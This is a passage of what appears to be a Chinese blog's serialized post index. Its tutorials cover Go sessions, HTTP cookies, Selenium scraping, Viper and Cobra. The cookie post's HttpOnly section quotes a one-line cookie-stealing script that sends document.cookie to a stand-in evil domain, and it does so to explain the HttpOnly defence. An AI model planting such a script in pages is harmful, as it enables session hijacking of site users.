http.StatusForbidden)\n        return\n    }\n\n    // Print secret message\n    fmt.Fprintln(w, \"The cake is a lie!\")\n}\n\nfunc login(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"cookie-name\")\n\n    // Authentication goes here\n    // ...\n\n    // Set user as authenticated\n    session.Values[\"authenticated\"] = true\n    session.Save(r, w)\n}\n\nfunc logout(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"cookie-name\")\n\n    // Revoke users authentication\n    session.Values[\"authenticated\"] = false\n    session.Save(r, w)\n}\n\nfunc main() {\n    http.HandleFunc(\"/secret\", secret)\n    http.HandleFunc(\"/login\", login)\n    http.HandleFunc(\"/logout\", logout)\n\n    http.ListenAndServe(\":8080\", nil)\n}\n```\n\n\n\n```bash\n$ go run sessions.go\n\n$ curl -s http://localhost:8080/secret\nForbidden\n\n$ curl -s -I http://localhost:8080/login\nSet-Cookie: cookie-name=MTQ4NzE5Mz...\n\n$ curl -s --cookie \"cookie-name=MTQ4NzE5Mz...\" http://localhost:8080/secret\nThe cake is a lie!\n```\n\n\n\n+ https://github.com/gin-contrib/sessions\n\n```go\npackage main\n\nimport (\n\t\"github.com/gin-contrib/sessions\"\n\t\"github.com/gin-contrib/sessions/cookie\"\n\t\"github.com/gin-gonic/gin\"\n)\n\nfunc main() {\n\tr := gin.Default()\n\tstore := cookie.NewStore([]byte(\"secret\"))\n\tr.Use(sessions.Sessions(\"mysession\", store))\n\n\tr.GET(\"/incr\", func(c *gin.Context) {\n\t\tsession := sessions.Default(c)\n\t\tvar count int\n\t\tv := session.Get(\"count\")\n\t\tif v == nil {\n\t\t\tcount = 0\n\t\t} else {\n\t\t\tcount = v.(int)\n\t\t\tcount++\n\t\t}\n\t\tsession.Set(\"count\", count)\n\t\tsession.Save()\n\t\tc.JSON(200, gin.H{\"count\": count})\n\t})\n\tr.Run(\":8000\")\n}\n```\n\n\n\n### 3. 参考资料\n\n+ https://www.iteye.com/blog/justsee-1570652\n+ https://gowebexamples.com/sessions/\n+ https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/06.0.md\n\n\n\n","tags":["session"],"categories":["Http"]},{"title":"cookie的介绍和使用","url":"%2Fp%2F2a7234ed.html","content":"\n\n\n### 0. 前言\n\nCookie 是在 HTTP 协议下，服务器或脚本可以维护客户工作站上信息的一种方式。Cookie 是由 `Web 服务器`保存在用户浏览器（客户端）上的小文本文件，它可以包含有关用户的信息。无论何时用户链接到服务器，Web 站点都可以访问 Cookie 信息。\n\nCookie实际上是一小段的文本信息。客户端请求服务器，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。服务器还可以根据需要修改Cookie的内容。\n\n<!-- more -->\n\n### 1. Cookie 介绍\n\nCookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。\n\nCookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。\n\n- 对话（session）管理：保存登录、购物车等需要记录的信息。\n- 个性化：保存用户的偏好，比如网页的字体大小、背景色等等。\n- 追踪：记录和分析用户行为。\n\n有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。\n\n\n\n> Cookie 包含以下几方面的信息:\n\n- Cookie 的名字\n- Cookie 的值（真正的数据写在这里面）\n- 到期时间\n- 所属域名（默认是当前域名）\n- 生效的路径（默认是当前网址）\n\n举例来说，用户访问网址`www.example.com`，服务器在浏览器写入一个 Cookie。这个 Cookie 就会包含`www.example.com`这个域名，以及根路径`/`。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为`/forums`，那么这个 Cookie 只有在访问`www.example.com/forums`及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。 \n\n\n\n##### 1.1 判断cookie\n\n浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。`window.navigator.cookieEnabled`属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。\n\n```bash\n// 浏览器是否打开 Cookie 功能\nwindow.navigator.cookieEnabled // true\n```\n\n`document.cookie`属性返回当前网页的 Cookie。\n\n```\n// 当前网页的 Cookie\ndocument.cookie\n```\n\n同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。\n\n浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，`http://example.com`设置的 Cookie，可以被`https://example.com`读取。\n\n\n\n##### 1.2 Cookie 与 HTTP 协议\n\nCookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。\n\n> 1.2.1 HTTP 回应：Cookie 的生成\n\n服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个`Set-Cookie`字段。\n\n```\nSet-Cookie:foo=bar\n```\n\n上面代码会在浏览器保存一个名为`foo`的 Cookie，它的值为`bar`。\n\nHTTP 回应可以包含多个`Set-Cookie`字段，即在浏览器生成多个 Cookie。下面是一个例子。\n\n```\nHTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n```\n\n除了 Cookie 的值，`Set-Cookie`字段还可以附加 Cookie 的属性。\n\n```\nSet-Cookie: <cookie-name>=<cookie-value>; Expires=<date>\nSet-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>\nSet-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Secure\nSet-Cookie: <cookie-name>=<cookie-value>; HttpOnly\n```\n\n一个`Set-Cookie`字段里面，可以同时包括多个属性，没有次序的要求。\n\n\n\n如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的`key`、`domain`、`path`和`secure`都匹配。举例来说，如果原始的 Cookie 是用如下的`Set-Cookie`设置的。\n\n```\nSet-Cookie: key1=value1; domain=example.com; path=/blog\n```\n\n改变上面这个 Cookie 的值，就必须使用同样的`Set-Cookie`。\n\n```\nSet-Cookie: key1=value2; domain=example.com; path=/blog\n```\n\n只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。\n\n```\nSet-Cookie: key1=value2; domain=example.com; path=/\n```\n\n上面的命令设置了一个全新的同名 Cookie，但是`path`属性不一样。下一次访问`example.com/blog`的时候，浏览器将向服务器发送两个同名的 Cookie。\n\n```\nCookie: key1=value1; key1=value2\n```\n\n上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。\n\n\n\n> 1.2.2 HTTP 请求：Cookie 的发送\n\n浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的`Cookie`字段。\n\n```\nCookie: foo=bar\n```\n\n上面代码会向服务器发送名为`foo`的 Cookie，值为`bar`。\n\n`Cookie`字段可以包含多个 Cookie，使用分号（`;`）分隔。\n\n```\nCookie: name=value; name2=value2; name3=value3\n```\n\n下面是一个例子。\n\n```\nGET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n```\n\n服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。\n\n- Cookie 的各种属性，比如何时过期。\n- 哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。\n\n\n\n##### 1.3 Cookie 的属性\n\n> 1.3.1 Expires，Max-Age\n\n`Expires`属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用`Date.prototype.toUTCString()`进行格式转换。\n\n```\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n```\n\n如果不设置该属性，或者设为`null`，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。\n\n\n\n`Max-Age`属性指定从现在开始 Cookie 存在的秒数，比如`60 * 60 * 24 * 365`（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。\n\n如果同时指定了`Expires`和`Max-Age`，那么`Max-Age`的值将优先生效。\n\n如果`Set-Cookie`字段没有指定`Expires`或`Max-Age`属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。\n\n\n\n> 1.3.2 Domain，Path\n\n`Domain`属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前 URL 的一级域名，比如`www.example.com`会设为`example.com`，而且以后如果访问`example.com`的任何子域名，HTTP 请求也会带上这个 Cookie。如果服务器在`Set-Cookie`字段指定的域名，不属于当前域名，浏览器会拒绝这个 Cookie。\n\n\n\n`Path`属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，`Path`属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，`PATH`属性是`/`，那么请求`/docs`路径也会包含该 Cookie。当然，前提是域名必须一致。\n\n\n\n> 1.3.3 Secure，HttpOnly\n\n`Secure`属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的`Secure`属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。\n\n`HttpOnly`属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是`Document.cookie`属性、`XMLHttpRequest`对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。\n\n```\n(new Image()).src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie;\n```\n\n上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的`HttpOnly`属性，上面代码就不会读到该 Cookie。\n\n\n\n##### 1.4 document.cookie\n\n`document.cookie`属性用于读写当前网页的 Cookie。\n\n读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有`HTTPOnly`属性。\n\n```\ndocument.cookie // \"foo=bar;baz=bar\"\n```\n\n上面代码从`document.cookie`一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。\n\n```\nvar cookies = document.cookie.split(';');\n\nfor (var i = 0; i < cookies.length; i++) {\n  console.log(cookies[i]);\n}\n// foo=bar\n// baz=bar\n```\n\n`document.cookie`属性是可写的，可以通过它为当前网站添加 Cookie。\n\n```\ndocument.cookie = 'fontSize=14';\n```\n\n写入的时候，Cookie 的值必须写成`key=value`的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用`encodeURIComponent`方法达到。\n\n但是，`document.cookie`一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。\n\n```\ndocument.cookie = 'test1=hello';\ndocument.cookie = 'test2=world';\ndocument.cookie\n// test1=hello;test2=world\n```\n\n`document.cookie`读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，`Cookie`字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，`Set-Cookie`字段是一行设置一个 Cookie。\n\n\n\n写入 Cookie 的时候，可以一起写入 Cookie 的属性。\n\n```\ndocument.cookie = \"foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT\";\n```\n\n\n\n上面代码中，写入 Cookie 的时候，同时设置了`expires`属性。属性值的等号两边，也是不能有空格的。\n\n各个属性的写入注意点如下。\n\n- `path`属性必须为绝对路径，默认为当前路径。\n- `domain`属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是`example.com`，就不能将其设为`foo.com`。该属性默认为当前的一级域名（不含二级域名）。\n- `max-age`属性的值为秒数。\n- `expires`属性的值为 UTC 格式，可以使用`Date.prototype.toUTCString()`进行日期格式转换。\n\n\n\n`document.cookie`写入 Cookie 的例子如下。\n\n```\ndocument.cookie = 'fontSize=14; '\n  + 'expires=' + someDate.toGMTString() + '; '\n  + 'path=/subdirectory; '\n  + 'domain=*.example.com';\n```\n\nCookie 的属性一旦设置完成，就没有办法读取这些属性的值。\n\n删除一个现存 Cookie 的唯一方法，是设置它的`expires`属性为一个过去的日期。\n\n```\ndocument.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';\n```\n\n上面代码中，名为`fontSize`的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。\n\n\n\n### 2. golang 使用 cookie\n\n+ cookie的结构体如下:\n\n``` go\ntype Cookie struct {\n    Name  string\n    Value string\n\n    Path       string    // optional\n    Domain     string    // optional\n    Expires    time.Time // optional\n    RawExpires string    // for reading cookies only\n\n    // MaxAge=0 means no 'Max-Age' attribute specified.\n    // MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'\n    // MaxAge>0 means Max-Age attribute present and given in seconds\n    MaxAge   int\n    Secure   bool\n    HttpOnly bool\n    Raw      string\n    Unparsed []string // Raw text of unparsed attribute-value pairs\n}\n```\n\n+ cookie 操作\n\n```go\n//设置Cookie\n\thttp.SetCookie(w, &http.Cookie{\n\t\tName:     \"auth_token\",\n\t\tValue:    token,\n\t\tDomain:   \"\",\n\t\tPath:     \"/\",\n\t\tMaxAge:   3600 * 24,\n\t\tHttpOnly: true,\n\t})\n\n//读取Cookie\ncookie, err := req.Cookie(\"auth_token\")\n\n//删除Cookie\n\thttp.SetCookie(w, &http.Cookie{\n\t\tName:     \"auth_token\",\n\t\tValue:    token,\n\t\tDomain:   \"\",\n\t\tPath:     \"/\",\n\t\tMaxAge:   -1,\n\t\tHttpOnly: true,\n\t})\n```\n\n\n\n### 3. 参考资料\n\n+ https://studygolang.com/articles/5905\n\n+ https://javascript.ruanyifeng.com/bom/cookie.html\n\n","tags":["cookie"],"categories":["Http"]},{"title":"爬虫利器selenium和无头浏览器的使用","url":"%2Fp%2F545fa06.html","content":"\n\n\n### 0. 前言\n\nSelenium 的初衷是打造一款优秀的自动化测试工具，但是慢慢的人们就发现，Selenium 的自动化用来做爬虫正合适。我们知道，传统的爬虫通过直接模拟 HTTP 请求来爬取站点信息，由于这种方式和浏览器访问差异比较明显，很多站点都采取了一些反爬的手段，而 Selenium 是通过模拟浏览器来爬取信息，其行为和用户几乎一样，反爬策略也很难区分出请求到底是来自 Selenium 还是真实用户。\n\n\n\n通过 Selenium 来做爬虫，不用去分析每个请求的具体参数，比起传统的爬虫开发起来更容易。Selenium 爬虫唯一的不足是慢，如果你对爬虫的速度没有要求，那使用 Selenium 是个非常不错的选择。\n\n<!-- more -->\n\n### 1. 安装和使用\n\n```bash\npip install selenium \n```\n\n\n\n##### 1.1 页面操作\n\n```python\n# 输入数据\nbrowser.find_element_by_css_selector('.rfm input[name=\"username\"]').send_keys('123456')\n\n# 选择数据\nbrowser.find_element_by_xpath(\"//select[@name='questionid']/option[text()='父亲的手机号码']\").click()\n\n# 敲回车\nbrowser.find_element_by_css_selector('button[name=\"loginsubmit\"]').send_keys(Keys.ENTER)\n\n\n# 只等3秒\nbrowser.implicitly_wait(3)\n\n# 获取cookie\ncookies_list = driver.get_cookies()\ncookies_dict = {}\nfor cookie in cookies_list:\n    cookies_dict[cookie['name']] = cookie['value']\nprint(cookies_dict)\n```\n\n\n\n### 2. 遇到的问题\n\n\n\n##### 2.1 [ImportError: cannot import name 'webdriver'](https://stackoverflow.com/questions/29092970/importerror-cannot-import-name-webdriver)\n\n文件不能命名为`selenium`\n\n\n\n##### 2.2  Message: 'chromedriver' executable needs to be in PATH.\n\n下载驱动 https://sites.google.com/a/chromium.org/chromedriver/downloads\n\n\n\n##### 2.3 Message: unknown error: cannot find Chrome binary\n\n+ centos 安装 chrome\n\n  ```bash\n  wget https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm\n  sudo yum localinstall google-chrome-stable_current_x86_64.rpm\n  google-chrome --no-sandbox --version # 看到版本后去下载相关的driver\n  ```\n\n+ ubuntu 安装 chrome\n\n  ```\n  wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb\n  sudo apt install ./google-chrome-stable_current_amd64.deb\ngoogle-chrome --no-sandbox --version\n  ```\n  \n  \n\n\n\n### 3. 参考资料\n\n+ https://cuiqingcai.com/2599.html\n\n+ [Python3中Selenium使用方法](https://zhuanlan.zhihu.com/p/29435831)\n\n\n+ [使用 Python + Selenium 打造浏览器爬虫](https://www.aneasystone.com/archives/2018/02/python-selenium-spider.html)","tags":["爬虫"],"categories":["爬虫"]},{"title":"golang配置信息库viper的使用","url":"%2Fp%2Fe2f28eb4.html","content":"\n\n\n### 0. 前言\n\nViper(毒蛇)是一个方便Go语言应用程序处理配置信息的库。它可以处理多种格式的配置。它支持的特性：\n\n- 设置默认值\n- 从JSON，TOML，YAML，HCL和Java属性配置文件中读取\n- 实时观看和重新读取配置文件（可选）\n- 从环境变量中读取\n- 从远程配置系统（etcd或Consul）读取，并观察变化\n- 从命令行标志读取\n- 从缓冲区读取\n- 设置显式值\n\n<!-- more -->\n\nViper读取配置信息的优先级顺序，从高到低，如下：\n\n- 显式调用Set函数\n- 命令行参数\n- 环境变量\n- 配置文件\n- key/value 存储系统\n- 默认值\n\nViper 的配置项的key不区分大小写。\n\n\n\n### 1. 安装使用\n\n##### 1.0 安装\n\n```bash\ngo get -u github.com/spf13/viper\n```\n\n\n\n##### 1.1 设置默认值\n\n默认值不是必须的，如果配置文件、环境变量、远程配置系统、命令行参数、Set函数都没有指定时，默认值将起作用。\n\n```go\nviper.SetDefault(\"ContentDir\", \"content\")\nviper.SetDefault(\"LayoutDir\", \"layouts\")\nviper.SetDefault(\"Taxonomies\", map[string]string{\"tag\": \"tags\", \"category\": \"categories\"})\n```\n\n\n\n##### 1.2 读取配置文件\n\nViper支持JSON、TOML、YAML、HCL和Java properties文件。\nViper可以搜索多个路径，但目前单个Viper实例仅支持单个配置文件。\nViper默认不搜索任何路径。\n以下是如何使用Viper搜索和读取配置文件的示例。\n路径不是必需的，但最好至少应提供一个路径，以便找到一个配置文件。\n\n```go\nviper.SetConfigName(\"config\") //  设置配置文件名 (不带后缀)\nviper.AddConfigPath(\"/etc/appname/\")   // 第一个搜索路径\nviper.AddConfigPath(\"$HOME/.appname\")  // 可以多次调用添加路径\nviper.AddConfigPath(\".\")               // 比如添加当前目录\nerr := viper.ReadInConfig() // 搜索路径，并读取配置数据\nif err != nil {\n    panic(fmt.Errorf(\"Fatal error config file: %s \\n\", err))\n}\n```\n\n\n\n##### 1.3 监视配置文件，重新读取配置数据\n\nViper支持让您的应用程序在运行时拥有读取配置文件的能力。\n需要重新启动服务器以使配置生效的日子已经一去不复返了，由viper驱动的应用程序可以在运行时读取已更新的配置文件，并且不会错过任何节拍。\n只需要调用viper实例的WatchConfig函数，你也可以指定一个回调函数来获得变动的通知。\n\n```go\nviper.WatchConfig()\nviper.OnConfigChange(func(e fsnotify.Event) {\n    fmt.Println(\"Config file changed:\", e.Name)\n})\n```\n\n\n\n##### 1.4 从 io.Reader 中读取配置\n\nViper预先定义了许多配置源，例如文件、环境变量、命令行参数和远程K / V存储系统，但您并未受其约束。\n您也可以实现自己的配置源，并提供给viper。\n\n```go\nviper.SetConfigType(\"yaml\") // or viper.SetConfigType(\"YAML\")\n\n// any approach to require this configuration into your program.\nvar yamlExample = []byte(`\nHacker: true\nname: steve\nhobbies:\n- skateboarding\n- snowboarding\n- go\nclothing:\n  jacket: leather\n  trousers: denim\nage: 35\neyes : brown\nbeard: true\n`)\n\nviper.ReadConfig(bytes.NewBuffer(yamlExample))\nviper.Get(\"name\") // 返回 \"steve\"\n```\n\n\n\n##### 1.5 注册并使用别名\n\n```go\nviper.RegisterAlias(\"loud\", \"Verbose\")\n\nviper.Set(\"verbose\", true) \nviper.Set(\"loud\", true)   // 这两句设置的都是同一个值\n\nviper.GetBool(\"loud\") // true\nviper.GetBool(\"verbose\") // true\n```\n\n\n\n##### 1.6 从环境变量中读取\n\nViper 完全支持环境变量，这是的应用程序可以开箱即用。\n有四个和环境变量有关的方法：\n\n+ AutomaticEnv()\n+ BindEnv(string...) : error\n+ SetEnvPrefix(string)\n+ SetEnvKeyReplacer(string...) *strings.Replacer\n\n注意，环境变量时区分大小写的。\n\nViper提供了一种机制来确保Env变量是唯一的。通过SetEnvPrefix，在从环境变量读取时会添加设置的前缀。BindEnv和AutomaticEnv都会使用到这个前缀。\n\nBindEnv需要一个或两个参数。第一个参数是键名，第二个参数是环境变量的名称。环境变量的名称区分大小写。如果未提供ENV变量名称，则Viper会自动假定该键名称与ENV变量名称匹配，并且ENV变量为全部大写。当您显式提供ENV变量名称时，它不会自动添加前缀。\n\n使用ENV变量时要注意，当关联后，每次访问时都会读取该ENV值。Viper在BindEnv调用时不读取ENV值。\n\nAutomaticEnv与SetEnvPrefix结合将会特别有用。当AutomaticEnv被调用时，任何viper.Get请求都会去获取环境变量。环境变量名为SetEnvPrefix设置的前缀，加上对应名称的大写。\n\nSetEnvKeyReplacer允许你使用一个strings.Replacer对象来将配置名重写为Env名。如果你想在Get()中使用包含-的配置名 ，但希望对应的环境变量名包含_分隔符，就可以使用该方法。使用它的一个例子可以在项目中viper_test.go文件里找到。\n例子：\n\n```go\nSetEnvPrefix(\"spf\") // 将会自动转为大写\nBindEnv(\"id\")\n\nos.Setenv(\"SPF_ID\", \"13\") // 通常通过系统环境变量来设置\n\nid := Get(\"id\") // 13\n```\n\n\n\n##### 1.7 绑定命令行参数\n\nViper支持绑定pflags参数。\n和BindEnv一样，当绑定方法被调用时，该值没有被获取，而是在被访问时获取。这意味着应该尽早进行绑定，甚至是在init()函数中绑定。\n\n利用BindPFlag()方法可以绑定单个flag。例子：\n\n```go\nserverCmd.Flags().Int(\"port\", 1138, \"Port to run Application server on\")\nviper.BindPFlag(\"port\", serverCmd.Flags().Lookup(\"port\"))\n```\n\n\n你也可以绑定已存在的pflag集合 (pflag.FlagSet):\n\n```go\npflag.Int(\"flagname\", 1234, \"help message for flagname\")\n\npflag.Parse()\nviper.BindPFlags(pflag.CommandLine)\n\ni := viper.GetInt(\"flagname\") // 通过viper从pflag中获取值\n```\n\n\n使用pflag并不影响其他库使用标准库中的flag。通过导入，pflag可以接管通过标准库的flag定义的参数。这是通`过调用pflag包中的AddGoFlagSet()方法实现的。例子：\n\n```go\npackage main\n\nimport (\n    \"flag\"\n    \"github.com/spf13/pflag\"\n)\n\nfunc main() {\n\n    // using standard library \"flag\" package\n    flag.Int(\"flagname\", 1234, \"help message for flagname\")\n\n    pflag.CommandLine.AddGoFlagSet(flag.CommandLine)\n    pflag.Parse()\n    viper.BindPFlags(pflag.CommandLine)\n\n    i := viper.GetInt(\"flagname\") // retrieve value from viper\n\n    ...\n}\n```\n\n\n\n##### 1.8 获取值\n\n在Viper中，有一些根据值的类型获取值的方法。存在一下方法：\n\n+ Get(key string) : interface{}\n\n+ GetBool(key string) : bool\n\n+ GetFloat64(key string) : float64\n\n+ GetInt(key string) : int\n\n+ GetString(key string) : string\n\n+ GetStringMap(key string) : map[string]interface{}\n\n+ GetStringMapString(key string) : map[string]string\n\n+ GetStringSlice(key string) : []string\n\n+ GetTime(key string) : time.Time\n\n+ GetDuration(key string) : time.Duration\n\n+ IsSet(key string) : bool\n\n\n如果Get函数未找到值，则返回对应类型的一个零值。可以通过 IsSet() 方法来检测一个健是否存在。例子:\n\n```go\nviper.GetString(\"logfile\") // Setting & Getting 不区分大小写\nif viper.GetBool(\"verbose\") {\n    fmt.Println(\"verbose enabled\")\n}\n```\n\n\n\n##### 1.9 访问嵌套键\n\n访问方法也接受嵌套的键。例如，如果加载了以下JSON文件：\n\n```json\n{\n    \"host\": {\n        \"address\": \"localhost\",\n        \"port\": 5799\n    },\n    \"datastore\": {\n        \"metric\": {\n            \"host\": \"127.0.0.1\",\n            \"port\": 3099\n        },\n        \"warehouse\": {\n            \"host\": \"198.0.0.1\",\n            \"port\": 2112\n        }\n    }\n}\n```\n\n\nViper可以通过.分隔符来访问嵌套的字段：\n\n```go\nGetString(\"datastore.metric.host\") // (returns \"127.0.0.1\")\n```\n\n\n这遵守前面确立的优先规则; 会搜索路径中所有配置，直到找到为止。\n例如，上面的文件，datastore.metric.host和 datastore.metric.port都已经定义（并且可能被覆盖）。如果另外 datastore.metric.protocol的默认值，Viper也会找到它。\n\n但是，如果datastore.metric值被覆盖（通过标志，环境变量，Set方法，...），则所有datastore.metric的子键将会未定义，它们被优先级更高的配置值所“遮蔽”。\n\n最后，如果存在相匹配的嵌套键，则其值将被返回。例如：\n\n```json\n{\n    \"datastore.metric.host\": \"0.0.0.0\",\n    \"host\": {\n        \"address\": \"localhost\",\n        \"port\": 5799\n    },\n    \"datastore\": {\n        \"metric\": {\n            \"host\": \"127.0.0.1\",\n            \"port\": 3099\n        },\n        \"warehouse\": {\n            \"host\": \"198.0.0.1\",\n            \"port\": 2112\n        }\n    }\n}\n\nGetString(\"datastore.metric.host\") // returns \"0.0.0.0\"\n```\n\n\n\n### 3. 参考资料\n\n+ [Golang的配置信息处理框架Viper](https://blog.51cto.com/13599072/2072753)\n+ https://www.jishuwen.com/d/2vNk","tags":["viper"],"categories":["golang"]},{"title":"golang命令行库cobra的使用","url":"%2Fp%2Fd50935d7.html","content":"\n### 0. 前言\n\nCobra(眼镜蛇)是一个库，其提供简单的接口来创建强大现代的CLI接口，类似于git或者go工具。同时，它也是一个应用，用来生成个人应用框架，从而开发以Cobra为基础的应用。Docker源码中使用了Cobra。\n\nCobra基于三个基本概念`commands`,`arguments`和`flags`。其中commands代表行为，arguments代表数值，flags代表对行为的改变。\n\n基本模型如下：\n\n```bash\nAPPNAME COMMAND ARG --FLAG\n\n# hugo是cmmands server是commands，port是flag\nhugo server --port=1313\n\n# clone是commands，URL是arguments，brae是flags\ngit clone URL --bare\n```\n\n\n<!-- more -->\n\n\n\n### 1. 安装和使用\n\n安装:\n\n```bash\ngo get -u github.com/spf13/cobra/cobra\n```\n\n\n\n你的项目结构可能如下:\n\n```bash\n  ▾ appName/\n    ▾ cmd/\n        root.go\n        version.go\n        commands.go\n      main.go\n```\n\n\n\n##### 1.1 main.go\n\nIn a Cobra app, typically the main.go file is very bare(裸露). It serves one purpose: initializing Cobra.\n\n```go\npackage main\n\nimport (\n  \"appName/cmd\"\n)\n\nfunc main() {\n  cmd.Execute()\n}\n```\n\n\n\n##### 1.2 rootcmd\n\n```go\nvar rootCmd = &cobra.Command{\n  Use:   \"hugo\",\n  Short: \"Hugo is a very fast static site generator\",\n  Long: `A Fast and Flexible Static Site Generator built with\n                love by spf13 and friends in Go.\n                Complete documentation is available at http://hugo.spf13.com`,\n  Run: func(cmd *cobra.Command, args []string) {\n    // Do Stuff Here\n  },\n}\n\nfunc Execute() {\n  if err := rootCmd.Execute(); err != nil {\n    fmt.Println(err)\n    os.Exit(1)\n  }\n}\n```\n\n\n\n##### 1.3 additional commands\n\n```go\npackage cmd\n\nimport (\n  \"fmt\"\n\n  \"github.com/spf13/cobra\"\n)\n\nfunc init() {\n  rootCmd.AddCommand(versionCmd)\n}\n\nvar versionCmd = &cobra.Command{\n  Use:   \"version\",\n  Short: \"Print the version number of Hugo\",\n  Long:  `All software has versions. This is Hugo's`,\n  Run: func(cmd *cobra.Command, args []string) {\n    fmt.Println(\"Hugo Static Site Generator v0.9 -- HEAD\")\n  },\n}\n```\n\n\n\n可以简单执行下面命令查看效果\n\n```bash\ngo run main.go help\ngo run main.go version\n```\n\n\n\n### 3. cobra 生成器\n\n在文件夹github.com/spf13/cobra/cobra下使用go install, 生成 cobra命令\n\n命令`cobra init [yourApp]`将会创建初始化应用，yourApp 是你的项目名称。它会在你的 GOPATH 目录下面生成项目。最新的操作方式:\n\n```bash\ncd /Users/liuwei/golang/src/github.com/unix2dos/golangTest\ncobra init --pkg-name=github.com/unix2dos/golangTest yourApp\n```\n\n\n\n接下来我们用`cobra add`来添加一些子命令。在你项目的目录下，运行下面这些命令：\n\n```bash\ncobra add serve\ncobra add config\ncobra add create -p 'configCmd'\n```\n\n这样以后，你就可以运行上面那些 app serve 之类的命令了。项目目录如下：\n\n```bash\n▾ app/\n  ▾ cmd/\n      serve.go\n      config.go\n      create.go\n    main.go\n```\n\n\n\n### 4. 使用Flags\n\ncobra 有两种 flag，一个是全局变量，一个是局部变量。全局什么意思呢，就是所以子命令都可以用。局部的只有自己能用。先看全局的：\n\n```go\nRootCmd.PersistentFlags().StringVar(&cfgFile, \"config\", \"\", \"config file (default is $HOME/.cobra_exp1.yaml)\")\n```\n\n在看局部的：\n\n```go\nRootCmd.Flags().BoolP(\"toggle\", \"t\", false, \"Help message for toggle\")\n```\n\n区别就在 RootCmd 后面的是 Flags 还是 PersistentFlags。\n\n\n\n### 5. 参考资料\n\n+ [Golang之使用Cobra](https://o-my-chenjian.com/2017/09/20/Using-Cobra-With-Golang/)\n\n+ 